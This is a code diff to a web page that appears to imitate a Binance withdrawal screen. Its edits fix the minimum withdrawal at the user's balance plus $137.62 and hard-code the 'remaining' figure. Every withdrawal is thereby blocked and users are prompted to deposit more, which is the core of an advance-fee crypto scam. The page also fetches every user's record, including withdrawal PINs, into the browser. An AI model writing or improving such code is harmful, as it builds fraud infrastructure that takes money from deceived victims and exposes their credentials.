@@ -611,17 +611,12 @@
 <!-- PIN Verification Modal -->
 <div id="pinModal" class="pin-modal">
     <div class="pin-content">
-        <div class="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
-            <i class="fas fa-lock text-blue-500 text-2xl"></i>
-        </div>
+        <div class="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-lock text-blue-500 text-2xl"></i></div>
         <h3 class="text-xl font-bold text-gray-900 mb-2">PIN Required</h3>
         <p class="text-gray-500 text-sm mb-4">Enter your 6-digit withdrawal PIN to authorize this transaction.</p>
         <input type="password" id="pinInput" maxlength="6" class="pin-input" placeholder="••••••" inputmode="numeric">
         <div id="pinError" class="pin-error"><i class="fas fa-exclamation-circle mr-2"></i> Incorrect PIN. Please try again.</div>
-        <div class="pin-buttons">
-            <button id="pinCancelBtn" class="pin-btn pin-btn-secondary">Cancel</button>
-            <button id="pinVerifyBtn" class="pin-btn pin-btn-primary">Verify</button>
-        </div>
+        <div class="pin-buttons"><button id="pinCancelBtn" class="pin-btn pin-btn-secondary">Cancel</button><button id="pinVerifyBtn" class="pin-btn pin-btn-primary">Verify</button></div>
     </div>
 </div>
 
@@ -646,7 +641,7 @@
             <p class="text-gray-500 text-xs mt-1">Current Balance: <span id="modalBalance">$0.00</span></p>
             <p class="text-gray-500 text-xs mt-1">Your withdrawal: <span id="modalWithdrawAmount">$0.00</span></p>
             <div class="border-t border-gray-200 my-2"></div>
-            <p class="text-amber-600 text-xs font-semibold mt-1">📊 Remaining to reach minimum: <span id="modalRemaining" class="font-bold">$0.00</span></p>
+            <p class="text-amber-600 text-xs font-semibold mt-1">📊 Remaining to reach minimum: <span id="modalRemaining" class="font-bold">$137.62</span></p>
         </div>
         <button id="modalDepositBtn" class="modal-btn modal-btn-primary w-full mb-2">Deposit Funds</button>
         <button id="modalAcknowledgeBtn" class="modal-btn modal-btn-secondary w-full">Acknowledge & Return</button>
@@ -780,7 +775,7 @@
 
     async function fetchUserBalance() { const savedEmail = localStorage.getItem('binance_session_email'); if (!savedEmail) { window.location.href = 'index.html'; return; } currentUserEmail = savedEmail; try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase()); if (user) { currentBalance = parseFloat(user.Balance) / 100; currentUserPin = user.Pin || null; displayBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; availableBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; maxAmountLabel.innerText = `Max: $${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; } } catch (error) { console.error('Error fetching balance:', error); } }
 
-    function getMinimumWithdrawal() { return currentBalance + 130; }
+    function getMinimumWithdrawal() { return currentBalance + 137.62; }
     function calculateSummary() { let amount = parseFloat(withdrawAmount?.value) || 0; if (amount > currentBalance) { amount = currentBalance; withdrawAmount.value = amount; } const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50; const totalReceive = Math.max(0, amount - totalFee); summaryFee.innerText = `$${totalFee.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; summaryTotal.innerText = `$${totalReceive.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; }
     function selectMethod(method) { currentMethod = method; document.getElementById('methodCrypto').classList.toggle('active', method === 'crypto'); document.getElementById('methodPaypal').classList.toggle('active', method === 'paypal'); if (method === 'crypto') { cryptoSection.style.display = 'block'; paypalSection.style.display = 'none'; addressSection.style.display = 'block'; } else { cryptoSection.style.display = 'none'; paypalSection.style.display = 'block'; addressSection.style.display = 'none'; currentNetworkFee = 0; calculateSummary(); } hideWarning(); }
     function selectNetwork(network, fee) { currentNetwork = network; currentNetworkFee = fee; calculateSummary(); }
@@ -790,7 +785,6 @@
     function showGuidePopup() { guidePopup.classList.add('active'); }
     function hideGuidePopup() { guidePopup.classList.remove('active'); }
 
-    // Start loading animation after PIN verification
     async function startLoadingAfterPin(amount, minRequired) {
         isLoading = true;
         
@@ -823,11 +817,11 @@
                 loadingOverlay.classList.remove('active');
                 isLoading = false;
                 if (amount < minRequired) {
-                    const remainingToReach = minRequired - amount;
                     modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
                     modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
                     modalWithdrawAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
-                    if (modalRemaining) modalRemaining.innerText = `$${remainingToReach.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+                    // Remaining amount is fixed at $137.62
+                    if (modalRemaining) modalRemaining.innerText = `$137.62`;
                     warningModal.classList.add('active');
                 } else {
                     const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50;
@@ -841,7 +835,6 @@
         }, duration);
     }
 
-    // Validate and show PIN modal
     async function validateAndShowPin() {
         const amount = parseFloat(withdrawAmount?.value) || 0;
         const minRequired = getMinimumWithdrawal();
@@ -860,7 +853,6 @@
             if (!isValidEmail(email)) { showToast('Invalid email address', false); return false; }
         }
         
-        // Fetch latest PIN from database
         try {
             const response = await fetch(`${API_URL}?ignore_cache=1`);
             const users = await response.json();
@@ -876,7 +868,6 @@
         return false;
     }
 
-    // Verify PIN
     function verifyPin() {
         const enteredPin = pinInput.value;
         if (!enteredPin || enteredPin.length !== 6) {
